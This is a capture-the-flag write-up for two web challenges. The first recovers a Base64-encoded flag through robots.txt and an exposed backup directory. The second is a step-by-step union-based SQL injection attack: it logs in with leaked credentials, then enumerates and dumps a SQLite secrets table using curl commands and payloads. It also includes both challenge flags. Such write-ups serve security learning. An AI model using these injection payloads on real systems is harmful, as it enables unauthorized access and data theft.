## Exploit3rs CTF – WriteUp By Irza_Chad

- [Terminal Velocity (Web)](#terminal-velocity)
- [The Insider Threat (Web/SQLi)](#the-insider-threat)

| Challenge Name | Category | Difficulty | Points | Flag Status |
|---|---|---|---|---|
| Terminal Velocity | Web | Easy | 150 | Captured |
| The Insider Threat | Web/SQLi | Hard | 700 | Captured |

---

### Terminal Velocity

Category: Web | Difficulty: Easy | Points: 150

Description: SkyBound Airlines' legacy booking system from 1987 hides secrets. A former sysadmin named Gerald left cryptic hints about robots knowing everything and backup files containing "military-grade encryption."

Target: `http://51.112.231.153/`

Walkthrough:
1. Check `robots.txt` (Gerald's hint: "the robots know everything").

  Example `robots.txt` found:

  ```text
  # SkyBound Airlines Web Crawler Configuration
  # Last updated: 1987

  User-agent: *
  Disallow: /flight-ops-admin-panel/
  Disallow: /backup/
  Disallow: /old-site/
  Disallow: /staff/
  ```

2. Visit the hidden directory listed (`/backup/`). Directory listing revealed:

  ```text
  Index of /backup/

  Name                Last Modified    Size
  ------------------------------------------------
  db_backup_1987.sql  15-Mar-1987 02:00  4.2K
  master_key.txt      15-Mar-1987 02:34    512B
  ```

3. Open `master_key.txt`. The file explicitly states the encoding and contains an encoded string:

  ```text
  #############################################
  # SKYBOUND AIRLINES - MASTER ACCESS KEY #
  #############################################

  Algorithm: Standard Base64 Encoding

  ENCODED_MASTER_KEY:

  RXhwbG9pdDNyc3tyMGIwdHNfdHh0XzFzX24wdF9zM2N1cjF0eX0=
  ```

4. Decode the Base64 string (local machine or CyberChef). Example commands:

  ```bash
  echo 'RXhwbG9pdDNyc3tyMGIwdHNfdHh0XzFzX24wdF9zM2N1cjF0eX0=' | base64 -d
  # or on Windows PowerShell:
  # [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXhwbG9pdDNyc3tyMGIwdHNfdHh0XzFzX24wdF9zM2N1cjF0eX0='))
  ```

  Decoded output:

  ```text
  Exploit3rs{r0b0ts_txt_1s_n0t_s3cur1ty}
  ```

Notes & Mitigation:
- Administrators should not expose sensitive paths in `robots.txt` — treat it as public information.
- Disable directory listing and avoid storing plaintext secrets in web-accessible locations.

Key Vulnerability: Security through obscurity and exposed backup files with weak/obvious encoding.

Flag:
```text
Exploit3rs{r0b0ts_txt_1s_n0t_s3cur1ty}
```

---

### The Insider Threat

Category: Web/SQLi | Difficulty: Hard | Points: 700

Description: Next.js portal with forgotten development credentials and vulnerable API endpoints. Objective: Exploit SQL injection to exfiltrate database secrets.

Target: `http://3.28.207.120`

Walkthrough:

**1. Authentication Bypass**
```bash
# Login with leaked dev credentials
curl -X POST http://3.28.207.120/api/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@nexacloud.io","password":"clouddemo2024"}'
```
Obtained session token for authenticated access.

**2. SQL Injection Discovery**
```bash
# Test for SQLi on client_id parameter
curl "http://3.28.207.120/api/tickets?client_id='" \
  -H "Cookie: session_token=[TOKEN]"
```
Response leaked SQLite error: `"unrecognized token: \"'\""` — confirming injection point.

**3. Column Enumeration**
```bash
# Brute-force column count for UNION attack
curl "http://3.28.207.120/api/tickets?client_id=1+UNION+SELECT+1,2,3,4,5,6,7--" \
  -H "Cookie: session_token=[TOKEN]"
```
Found 7 columns in the tickets table.

**4. Database Enumeration**
```sql
-- Extract table names
1 UNION SELECT 1,2,group_concat(name),4,5,6,7 FROM sqlite_master WHERE type='table'--
-- Tables: users, tickets, sessions, secrets
```

**5. Flag Extraction**
```sql
-- Dump secrets table
1 UNION SELECT 1,2,group_concat(key_name||':'||key_value),4,5,6,7 FROM secrets--
```

Key Vulnerability: Authenticated Union-Based SQL Injection; unsanitized `client_id` parameter concatenated directly into SQL query.

Flag:
```text
Exploit3rs{wh3n_qu3r13s_sp34k_s3cr3ts_l34k}
```

---
